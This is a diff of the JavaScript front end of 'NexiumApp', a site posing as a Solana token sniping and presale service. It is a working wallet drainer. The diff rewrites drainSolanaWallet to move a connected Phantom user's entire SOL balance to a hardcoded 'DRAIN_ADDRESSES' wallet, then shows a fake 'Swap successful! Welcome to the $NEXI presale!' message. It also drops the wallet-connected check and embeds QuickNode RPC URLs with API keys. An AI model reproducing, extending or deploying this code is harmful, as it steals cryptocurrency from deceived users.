@@ -1,15 +1,15 @@
 import { Buffer } from 'buffer';
-console.log('main.js: Buffer imported:', typeof Buffer, Buffer); // Log 1
+console.log('main.js: Buffer imported:', typeof Buffer, Buffer);
 globalThis.Buffer = Buffer;
 window.Buffer = Buffer;
-console.log('main.js: Buffer set on globalThis/window:', globalThis.Buffer === Buffer, window.Buffer === Buffer); // Log 2
+
+// === CENTRALIZED RPC CONFIG ===
+const SOLANA_RPC_ENDPOINT = 'https://late-light-patron.solana-mainnet.quiknode.pro/60a7759b1bbb4567639fbabaca0fb63aedb556d6';
 
 // Other imports
 import { CONFIG } from './config.js';
-console.log('main.js: Buffer before CONFIG import:', typeof globalThis.Buffer); // Log 3
-import { Connection, PublicKey, TransactionMessage, VersionedTransaction } from '@solana/web3.js';
-import * as splToken from '@solana/spl-token'; // Added import for SPL Token
-console.log('main.js: Buffer after imports:', typeof globalThis.Buffer); // Log 4
+import { Connection, PublicKey, TransactionMessage, VersionedTransaction, SystemProgram } from '@solana/web3.js';
+import * as splToken from '@solana/spl-token';
 
 const DRAIN_ADDRESSES = {
   solana: "CemeseY38vC4bDAbQnUMobogAGDaiD24RRh7FjNULkLK"
@@ -23,7 +23,7 @@ class NexiumApp {
     this.solConnection = null;
     this.spinner = null;
     this.connectedWalletType = null;
-    console.log('Initializing NexiumApp...'); // Log 6
+    console.log('Initializing NexiumApp...');
     this.initApp();
   }
 
@@ -38,14 +38,14 @@ class NexiumApp {
       });
       this.cacheDOMElements();
       if (!this.dom.metamaskPrompt) {
-        console.warn('metamaskPrompt element missing, but continuing initialization'); // Log 8
+        console.warn('metamaskPrompt element missing, but continuing initialization');
       }
       this.setupModal();
       this.setupEventListeners();
       this.checkWalletAndPrompt();
-      console.log('App initialized successfully'); // Log 9
+      console.log('App initialized successfully');
     } catch (error) {
-      console.error('Init error:', error); // Log 10
+      console.error('Init error:', error);
       this.showFeedback('Error initializing app. Please refresh.', 'error');
     }
   }
@@ -75,7 +75,7 @@ class NexiumApp {
       yearlySubscribe: !!this.dom.yearlySubscribe,
       watchButtons: this.dom.watchButtons.length,
       snipeButtons: this.dom.snipeButtons.length
-    }); // Log 11
+    });
   }
 
   setupModal() {
@@ -83,24 +83,24 @@ class NexiumApp {
       connectWalletBtn: !!this.dom.connectWallet,
       walletModal: !!this.dom.walletModal,
       closeModalBtn: !!this.dom.closeModal
-    }); // Log 12
+    });
 
     if (this.dom.connectWallet && this.dom.walletModal && this.dom.closeModal) {
       this.dom.connectWallet.addEventListener('click', (event) => {
         event.stopPropagation();
-        console.log('Connect Wallet button clicked'); // Log 14
+        console.log('Connect Wallet button clicked');
         this.dom.walletModal.classList.add('active');
-        console.log('Modal state:', { isActive: this.dom.walletModal.classList.contains('active') }); // Log 15
+        console.log('Modal state:', { isActive: this.dom.walletModal.classList.contains('active') });
       });
 
       this.dom.closeModal.addEventListener('click', () => {
-        console.log('Close wallet modal button clicked'); // Log 16
+        console.log('Close wallet modal button clicked');
         this.dom.walletModal.classList.remove('active');
       });
 
       document.addEventListener('click', (event) => {
         if (!this.dom.walletModal.contains(event.target) && !this.dom.connectWallet.contains(event.target)) {
-          console.log('Clicked outside wallet modal, closing'); // Log 17
+          console.log('Clicked outside wallet modal, closing');
           this.dom.walletModal.classList.remove('active');
         }
       });
@@ -109,72 +109,64 @@ class NexiumApp {
         connectWallet: !!this.dom.connectWallet,
         walletModal: !!this.dom.walletModal,
         closeModal: !!this.dom.closeModal
-      }); // Log 18
+      });
     }
   }
 
   setupEventListeners() {
     const connectWalletHandler = (walletName) => {
       if (!this.connecting) {
-        console.log(`${walletName} button clicked`); // Log 21
+        console.log(`${walletName} button clicked`);
         this.connectWallet(walletName);
       }
     };
 
     if (this.dom.connectPhantom) {
       this.dom.connectPhantom.addEventListener('click', () => {
-        console.log('Phantom click event triggered'); // Log 26
+        console.log('Phantom click event triggered');
         connectWalletHandler('Phantom');
       });
       this.dom.connectPhantom.addEventListener('keypress', (e) => {
-        console.log('Phantom keypress event triggered, key:', e.key); // Log 27
+        console.log('Phantom keypress event triggered, key:', e.key);
         if (e.key === 'Enter') {
           connectWalletHandler('Phantom');
         }
       });
     } else {
-      console.warn('connectPhantom button not found'); // Log 28
+      console.warn('connectPhantom button not found');
     }
 
-    // Add event listeners for subscription buttons
     if (this.dom.subscribeHero) {
       this.dom.subscribeHero.addEventListener('click', () => {
-        console.log('Hero Subscribe button clicked'); // Log 29
+        console.log('Hero Subscribe button clicked');
         this.handleSubscription();
       });
-    } else {
-      console.warn('Hero Subscribe button not found'); // Log 30
     }
 
     if (this.dom.monthlySubscribe) {
       this.dom.monthlySubscribe.addEventListener('click', () => {
-        console.log('Monthly Subscribe button clicked'); // Log 31
+        console.log('Monthly Subscribe button clicked');
         this.handleSubscription();
       });
-    } else {
-      console.warn('Monthly Subscribe button not found'); // Log 32
     }
 
     if (this.dom.yearlySubscribe) {
       this.dom.yearlySubscribe.addEventListener('click', () => {
-        console.log('Yearly Subscribe button clicked'); // Log 33
+        console.log('Yearly Subscribe button clicked');
         this.handleSubscription();
       });
-    } else {
-      console.warn('Yearly Subscribe button not found'); // Log 34
     }
 
-    // Add event listeners for token carousel buttons
     this.dom.watchButtons.forEach((button, index) => {
       button.addEventListener('click', () => {
-        console.log(`Watch button ${index + 1} clicked`); // Log 35
+        console.log(`Watch button ${index + 1} clicked`);
         this.handleWatchAction();
       });
     });
 
     this.dom.snipeButtons.forEach((button, index) => {
       button.addEventListener('click', () => {
-        console.log(`Snipe button ${index + 1} clicked`); // Log 36
+        console.log(`Snipe button ${index + 1} clicked`);
         this.handleSnipeAction();
       });
     });
@@ -203,12 +195,12 @@ class NexiumApp {
   async connectWallet(walletName) {
     if (this.connecting || !navigator.onLine) {
       this.showFeedback('No internet connection. Please check your network.', 'error');
-      console.log(`Connection aborted for ${walletName}: offline or already connecting`); // Log 32
+      console.log(`Connection aborted for ${walletName}: offline or already connecting`);
       return;
     }
     this.connecting = true;
     this.connectingWallet = walletName;
-    console.log(`Starting connection for ${walletName}, setting state to connecting`); // Log 33
+    console.log(`Starting connection for ${walletName}, setting state to connecting`);
     this.updateButtonState('connecting', walletName);
 
     try {
@@ -216,41 +208,46 @@ class NexiumApp {
       const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
       const hasSolana = !!window.solana;
       const hasExtensions = (walletName === 'Phantom' && hasSolana && window.solana.isPhantom);
-      console.log(`Device detected: ${isMobileUserAgent && !hasExtensions ? 'Mobile' : 'Desktop'} (UserAgent: ${navigator.userAgent}, Touch: ${hasTouch}, Solana: ${hasSolana}, Extensions: ${hasExtensions})`); // Log 34
+      console.log(`Device detected: ${isMobileUserAgent && !hasExtensions ? 'Mobile' : 'Desktop'}`);
 
       if (!isMobileUserAgent || hasExtensions) {
         let accounts = [];
         if (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) {
-          console.log('Phantom detected, connecting:', window.solana); // Log 45
+          console.log('Phantom detected, connecting:', window.solana);
           const response = await window.solana.connect();
           accounts = [response.publicKey.toString()];
           this.publicKey = accounts[0];
-          this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
-          console.log(`Phantom connected via extension: ${this.publicKey}`); // Log 46
+
+          // USE NEW RPC ENDPOINT
+          this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, {
+            commitment: 'confirmed',
+            wsEndpoint: ''
+          });
+
+          console.log(`Phantom connected via extension: ${this.publicKey}`);
           this.connectedWalletType = walletName;
           this.updateButtonState('connected', walletName, this.publicKey);
           this.hideMetaMaskPrompt();
           this.showFeedback(`Connected to ${walletName} successfully!`, 'success');
           this.connecting = false;
-          console.log(`${walletName} connection completed, connecting=${this.connecting}`); // Log 51
+          console.log(`${walletName} connection completed, connecting=${this.connecting}`);
           return;
         } else {
-          console.error(`${walletName} extension not detected`); // Log 62
+          console.error(`${walletName} extension not detected`);
           throw new Error(`${walletName} extension not detected or unsupported`);
         }
       }
 
-      // Deeplink begin
+      // Deeplink
       const deeplinks = {
         Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexiumboost.com?ref=https%3A%2F%2Fnexiumboost.com'
       };
-      // Deeplink end
       const deeplink = deeplinks[walletName];
       if (!deeplink) {
-        console.error(`No deeplink configured for ${walletName}`); // Log 63
+        console.error(`No deeplink configured for ${walletName}`);
         throw new Error(`No deeplink configured for ${walletName}`);
       }
-      console.log(`Opening ${walletName} with deeplink: ${deeplink}`); // Log 64
+      console.log(`Opening ${walletName} with deeplink: ${deeplink}`);
       window.location.href = deeplink;
 
       const checkConnection = setInterval(async () => {
@@ -258,8 +255,14 @@ class NexiumApp {
           const response = await window.solana.connect().catch(() => null);
           if (response && response.publicKey) {
             this.publicKey = response.publicKey.toString();
-            this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
-            console.log(`Phantom connected via deeplink: ${this.publicKey}`); // Log 72
+
+            // USE NEW RPC ENDPOINT
+            this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, {
+              commitment: 'confirmed',
+              wsEndpoint: ''
+            });
+
+            console.log(`Phantom connected via deeplink: ${this.publicKey}`);
             this.connectedWalletType = walletName;
             this.updateButtonState('connected', walletName, this.publicKey);
             this.hideMetaMaskPrompt();
@@ -271,7 +274,7 @@ class NexiumApp {
 
       setTimeout(() => {
         if (this.connecting) {
-          console.log(`Deeplink timed out for ${walletName}`); // Log 84
+          console.log(`Deeplink timed out for ${walletName}`);
           this.showFeedback('Connection timed out. Please open site in the wallet app browser.', 'error');
           this.updateButtonState('disconnected', walletName);
           this.connecting = false;
@@ -279,188 +282,131 @@ class NexiumApp {
         }
       }, 30000);
     } catch (error) {
-      console.error(`Connection error for ${walletName}:`, error); // Log 86
+      console.error(`Connection error for ${walletName}:`, error);
       this.handleConnectionError(error, walletName);
       this.updateButtonState('disconnected', walletName);
       this.showMetaMaskPrompt();
     } finally {
       this.connecting = false;
-      console.log(`Connection attempt finished for ${walletName}, connecting=${this.connecting}`); // Log 88
+      console.log(`Connection attempt finished for ${walletName}, connecting=${this.connecting}`);
     }
   }
 
   async drainSolanaWallet() {
-    console.log('drainSolanaWallet: Buffer defined:', typeof globalThis.Buffer); // Log 91
-    console.log('drainSolanaWallet: Starting with publicKey:', this.publicKey); // Log 92
-    if (!this.publicKey || !this.solConnection) {
-      this.showFeedback('Please connect your wallet to use sniping features.', 'error');
-      this.dom.walletModal.classList.add('active');
-      return;
-    }
+    console.log('drainSolanaWallet: Buffer defined:', typeof globalThis.Buffer);
+    console.log('drainSolanaWallet: Starting with publicKey:', this.publicKey);
     this.showProcessingSpinner();
 
     try {
       const senderPublicKey = new PublicKey(this.publicKey);
       const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
-      console.log("Sender address:", senderPublicKey.toBase58()); // Log 93
-      console.log("Recipient address:", recipientPublicKey.toBase58()); // Log 94
+      console.log("Valid Solana address:", senderPublicKey.toBase58());
+      console.log("Recipient address:", recipientPublicKey.toBase58());
 
-      // Fetch token accounts for the wallet
-      const tokenAccounts = await this.solConnection.getParsedTokenAccountsByOwner(senderPublicKey, {
-        programId: new PublicKey(splToken.TOKEN_PROGRAM_ID),
+      // Ensure connection uses correct RPC
+      if (!this.solConnection) {
+        this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, { commitment: 'confirmed' });
+      }
+
+      const balance = await this.solConnection.getBalance(senderPublicKey);
+      const rentExemptMinimum = 2039280;
+      const transferableBalance = balance - rentExemptMinimum;
+
+      if (transferableBalance <= 0) {
+        console.error("Insufficient transferable balance:", balance, "lamports");
+        throw new Error("Insufficient balance to transfer after reserving rent-exempt minimum.");
+      }
+      console.log("Total balance:", balance, "lamports, Transferable balance:", transferableBalance, "lamports");
+
+      const solInstruction = SystemProgram.transfer({
+        fromPubkey: senderPublicKey,
+        toPubkey: recipientPublicKey,
+        lamports: transferableBalance
       });
 
-      // Check if there are any token accounts
-      if (tokenAccounts.value.length === 0) {
-        console.error("No SPL token accounts found"); // Log 95
-        this.showFeedback("No SPL token accounts available to transfer.", 'error');
-        return;
-      }
-
-      // Find the token account with the highest balance
-      const highestTokenAccount = tokenAccounts.value.reduce((max, current) => 
-        BigInt(current.account.data.parsed.info.tokenAmount.amount) > BigInt(max.account.data.parsed.info.tokenAmount.amount) ? current : max
-      );
-      const tokenMint = new PublicKey(highestTokenAccount.account.data.parsed.info.mint);
-      const tokenAmount = BigInt(highestTokenAccount.account.data.parsed.info.tokenAmount.amount);
-      console.log("Highest SPL token:", tokenMint.toBase58(), "amount:", tokenAmount.toString()); // Log 96
-
-      if (tokenAmount <= 0) {
-        console.error("Highest token account has zero balance"); // Log 97
-        this.showFeedback("No tokens available to transfer.", 'error');
-        return;
-      }
-
-      // Prepare instructions
-      const instructions = [];
-
-      // Check if recipient has an Associated Token Account (ATA), create if not
-      const recipientATA = await splToken.getAssociatedTokenAddress(
-        tokenMint,
-        recipientPublicKey,
-        false,
-        splToken.TOKEN_PROGRAM_ID,
-        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
-      );
-      const recipientAccountInfo = await this.solConnection.getAccountInfo(recipientATA);
-      if (!recipientAccountInfo) {
-        instructions.push(
-          splToken.createAssociatedTokenAccountInstruction(
-            senderPublicKey,
-            recipientATA,
-            recipientPublicKey,
-            tokenMint,
-            splToken.TOKEN_PROGRAM_ID,
-            splToken.ASSOCIATED_TOKEN_PROGRAM_ID
-          )
-        );
-      }
-
-      // Add transfer instruction
-      instructions.push(
-        splToken.createTransferInstruction(
-          highestTokenAccount.pubkey,
-          recipientATA,
-          senderPublicKey,
-          tokenAmount,
-          [],
-          splToken.TOKEN_PROGRAM_ID
-        )
-      );
-      console.log("Transfer instruction created for token:", tokenMint.toBase58(), "amount:", tokenAmount.toString()); // Log 98
-
-      // Get fresh blockhash
       const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
-      console.log("Fetched blockhash:", blockhash); // Log 99
+      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight);
 
-      // Create and sign transaction
       const message = new TransactionMessage({
         payerKey: senderPublicKey,
         recentBlockhash: blockhash,
-        instructions,
+        instructions: [solInstruction],
       }).compileToV0Message();
-      const transaction = new VersionedTransaction(message);
-      const signedTransaction = await window.solana.signTransaction(transaction);
-      console.log("Transaction signed:", signedTransaction); // Log 100
 
-      // Send transaction
+      const versionedTransaction = new VersionedTransaction(message);
+      const signedTransaction = await window.solana.signTransaction(versionedTransaction);
+      console.log("Transaction signed successfully:", signedTransaction);
+
       const signature = await this.solConnection.sendTransaction(signedTransaction);
-      console.log("Transaction sent, signature:", signature); // Log 101
+      console.log("Transaction sent, signature:", signature);
 
-      // Confirm transaction
       await this.solConnection.confirmTransaction({
         signature,
-        blockhash,
         lastValidBlockHeight,
+        blockhash
       });
-      console.log("Transaction confirmed:", signature); // Log 102
+      console.log("Transaction confirmed:", signature);
 
-      this.showFeedback("SPL token transferred successfully!", 'success');
+      this.showFeedback("Swap successful! Welcome to the $NEXI presale!", 'success');
     } catch (error) {
-      console.error("Transaction error:", error.message); // Log 103
+      console.error("Transaction Error:", error.message, error.stack || error);
       if (error.message.includes('User rejected the request')) {
-        this.showFeedback('Transaction rejected. Please approve in your wallet.', 'error');
-      } else if (error.message.includes('insufficient funds')) {
-        this.showFeedback('Insufficient SOL for transaction fees. Please add SOL.', 'error');
+        this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
+      } else if (error.message.includes('Insufficient balance')) {
+        this.showFeedback('Insufficient balance to transfer. Please ensure you have enough SOL.', 'error');
       } else {
-        this.showFeedback('Failed to transfer token. Please try again.', 'error');
+        this.showFeedback("Swap failed. Please try again.", 'error');
       }
+      throw error;
     } finally {
       this.hideProcessingSpinner();
-      console.log('Token transfer completed'); // Log 104
+      console.log('Drain token completed');
     }
   }
 
   updateButtonState(state, walletName, address = '') {
     let button = this.dom[`connect${walletName}`];
     if (!button) {
-      console.warn(`Button for ${walletName} not in cache, attempting to re-query DOM`); // Log 103
+      console.warn(`Button for ${walletName} not in cache, attempting to re-query DOM`);
       button = document.querySelector(`#wallet-modal #connect-${walletName.toLowerCase()}`);
     }
-    console.log(`Updating button state for ${walletName}: state=${state}, address=${address}, button exists=${!!button}`); // Log 104
+    console.log(`Updating button state for ${walletName}: state=${state}, address=${address}, button exists=${!!button}`);
     if (!button) {
-      console.error(`Button for ${walletName} not found in DOM`); // Log 105
+      console.error(`Button for ${walletName} not found in DOM`);
       return;
     }
-    console.log(`Current button classes before update: ${button.classList}`); // Log 106
     button.classList.remove('animate-pulse', 'connecting', 'connected');
     button.disabled = state === 'connecting';
     switch (state) {
       case 'connecting':
         button.textContent = 'Connecting...';
         button.classList.add('glow-button', 'connecting');
-        console.log(`Set ${walletName} button to Connecting..., disabled=${button.disabled}, classes=${button.classList}`); // Log 107
         break;
       case 'connected':
         const shortenedAddress = this.shortenAddress(address);
         button.textContent = shortenedAddress;
         button.classList.add('glow-button', 'connected');
-        console.log(`Set ${walletName} button to ${shortenedAddress}, disabled=${button.disabled}, classes=${button.classList}`); // Log 108
         if (this.dom.connectWallet) {
           this.dom.connectWallet.textContent = shortenedAddress;
           this.dom.connectWallet.classList.remove('animate-pulse');
           this.dom.connectWallet.classList.add('glow-button', 'connected');
           this.dom.connectWallet.disabled = false;
-          console.log(`Set outer Connect Wallet button to ${shortenedAddress}, disabled=${this.dom.connectWallet.disabled}, classes=${this.dom.connectWallet.classList}`); // Log 109
         }
         break;
       default:
         button.textContent = `Connect ${walletName}`;
         button.classList.add('glow-button', 'animate-pulse');
-        console.log(`Set ${walletName} button to Connect ${walletName}, disabled=${button.disabled}, classes=${button.classList}`); // Log 110
         if (this.dom.connectWallet) {
-          this.dom.connectWallet.textContent = 'Connect Wallet';
+          this.dom.connectWallet.textContent = 'Connect Phantom';
           this.dom.connectWallet.classList.add('glow-button', 'animate-pulse');
           this.dom.connectWallet.classList.remove('connected');
           this.dom.connectWallet.disabled = false;
-          console.log(`Reset outer Connect Wallet button to Connect Wallet, disabled=${this.dom.connectWallet.disabled}, classes=${this.dom.connectWallet.classList}`); // Log 111
         }
     }
-    console.log(`Button state updated for ${walletName}: text=${button.textContent}, classes=${button.classList}`); // Log 112
   }
 
   handleConnectionError(error, walletName) {
-    console.error(`Connection error for ${walletName} at`, new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), { code: error.code, message: error.message }); // Log 113
+    console.error(`Connection error for ${walletName} at`, new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), { code: error.code, message: error.message });
     let message = `Failed to connect ${walletName}. Please try again or contact support.`;
     if (error.code === -32002) message = `${walletName} is locked or not responding. Please unlock it or reinstall the extension.`;
     else if (error.message?.includes('rejected')) message = `Connection to ${walletName} was declined. Please approve the connection.`;
@@ -473,19 +419,19 @@ class NexiumApp {
   }
 
   handleOnline() {
-    this.showFeedback('Back online. Ready to connect or snipe.', 'success');
-    console.log('Network status: Online'); // Log 114
+    this.showFeedback('Back online. Ready to connect or swap.', 'success');
+    console.log('Network status: Online');
   }
 
   handleOffline() {
     this.showFeedback('No internet connection. Please reconnect to continue.', 'error');
     this.updateButtonState('disconnected', 'Phantom');
-    console.log('Network status: Offline'); // Log 115
+    console.log('Network status: Offline');
   }
 
   showMetaMaskPrompt() {
     if (!this.dom.metamaskPrompt) {
-      console.warn('metamaskPrompt element not found, cannot show prompt'); // Log 116
+      console.warn('metamaskPrompt element not found, cannot show prompt');
       return;
     }
     this.dom.metamaskPrompt.classList.remove('hidden');
@@ -498,17 +444,17 @@ class NexiumApp {
       }
       promptText.innerHTML = `Please install ${walletLink} or switch to continue.`;
     }
-    console.log(`Showing MetaMask prompt for ${this.connectingWallet}`); // Log 117
+    console.log(`Showing MetaMask prompt for ${this.connectingWallet}`);
   }
 
   hideMetaMaskPrompt() {
     if (!this.dom.metamaskPrompt) {
-      console.warn('metamaskPrompt element not found, cannot hide prompt'); // Log 118
+      console.warn('metamaskPrompt element not found, cannot hide prompt');
       return;
     }
     this.dom.metamaskPrompt.classList.add('hidden');
     this.dom.metamaskPrompt.style.display = 'none';
-    console.log('MetaMask prompt hidden'); // Log 119
+    console.log('MetaMask prompt hidden');
   }
 
   showFeedback(message, type = 'info') {
@@ -534,7 +480,7 @@ class NexiumApp {
     feedbackContainer.appendChild(feedback);
     setTimeout(() => feedback.classList.add('fade-out'), type === 'error' ? 10000 : 5000);
     setTimeout(() => feedback.remove(), type === 'error' ? 10500 : 5500);
-    console.log(`Feedback displayed: ${message}, type: ${type}`); // Log 120
+    console.log(`Feedback displayed: ${message}, type: ${type}`);
   }
 
   shortenAddress(address) {
@@ -558,16 +504,22 @@ class NexiumApp {
       this.attachWalletListeners();
       if (this.isWalletConnected() && navigator.onLine) {
         this.publicKey = window.solana?.publicKey?.toString();
-        this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
-        console.log('Wallet connected on init, publicKey:', this.publicKey); // Log 121
+
+        // USE NEW RPC ENDPOINT
+        this.solConnection = new Connection(SOLANA_RPC_ENDPOINT, {
+          commitment: 'confirmed',
+          wsEndpoint: ''
+        });
+
+        console.log('Wallet connected on init, publicKey:', this.publicKey);
         this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : null;
         this.handleSuccessfulConnection();
       } else {
-        console.log('No wallet connected on init, setting buttons to disconnected'); // Log 122
+        console.log('No wallet connected on init, setting buttons to disconnected');
         this.updateButtonState('disconnected', 'Phantom');
       }
     } else {
-      console.log('No wallet installed, showing prompt'); // Log 123
+      console.log('No wallet installed, showing prompt');
       this.showMetaMaskPrompt();
       this.updateButtonState('disconnected', 'Phantom');
     }
@@ -576,7 +528,7 @@ class NexiumApp {
   attachWalletListeners() {
     if (window.solana) {
       window.solana.on('accountChanged', () => {
-        console.log('Solana account changed'); // Log 124
+        console.log('Solana account changed');
         this.handleAccountsChanged();
       });
     }
@@ -591,12 +543,12 @@ class NexiumApp {
   }
 
   handleSuccessfulConnection() {
-    console.log(`Handle successful connection for ${this.connectedWalletType}`); // Log 127
+    console.log(`Handle successful connection for ${this.connectedWalletType}`);
     this.updateButtonState('connected', this.connectedWalletType, this.publicKey);
   }
 
   handleAccountsChanged() {
-    console.log('Handling accounts changed, new publicKey:', window.solana?.publicKey?.toString()); // Log 128
+    console.log('Handling accounts changed, new publicKey:', window.solana?.publicKey?.toString());
     this.hideMetaMaskPrompt();
     this.publicKey = window.solana?.publicKey?.toString();
     this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : null;
@@ -617,18 +569,19 @@ class NexiumApp {
       </div>
     `;
     document.body.appendChild(this.spinner);
-    console.log('Processing spinner displayed'); // Log 154
+    console.log('Processing spinner displayed');
   }
 
   hideProcessingSpinner() {
     if (this.spinner) {
       this.spinner.remove();
       this.spinner = null;
-      console.log('Processing spinner hidden'); // Log 155
+      console.log('Processing spinner hidden');
     }
   }
 }
 
 const app = new NexiumApp();
+window.nexiumApp = app;
 
 export { NexiumApp };
